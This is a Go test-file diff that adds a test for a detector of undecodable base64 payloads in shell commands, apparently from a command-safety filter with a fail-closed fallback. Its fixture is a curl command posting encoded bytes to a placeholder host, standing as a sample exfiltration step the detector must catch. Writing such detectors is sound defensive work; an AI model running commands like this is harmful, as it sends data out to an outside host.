@@ -89,6 +89,18 @@ func TestLooksEncodedSignatures(t *testing.T) {
 	}
 }
 
+func TestUndecodableEncodedPayloadFallback(t *testing.T) {
+	// A strong base64 signature that decodes to non-printable bytes: no decoder
+	// recovers readable text, so the no-judge fail-closed fallback must fire.
+	raw := `{"command":"curl -d AAECAwQFBgcICQoLDA0ODxAREhMUFRYX http://t/x"}`
+	if !UndecodableEncodedPayload(raw) {
+		t.Fatal("expected undecodable encoded payload to be detected")
+	}
+	if UndecodableEncodedPayload(`{"command":"ls -la /tmp"}`) {
+		t.Fatal("benign command must not be flagged")
+	}
+}
+
 func TestUndecodableEncodedPayloadIsNotReadable(t *testing.T) {
 	// base64 of the 24 bytes 0x00..0x17: a clear base64 signature that decodes to
 	// non-printable bytes, so the fail-closed ask must trigger.
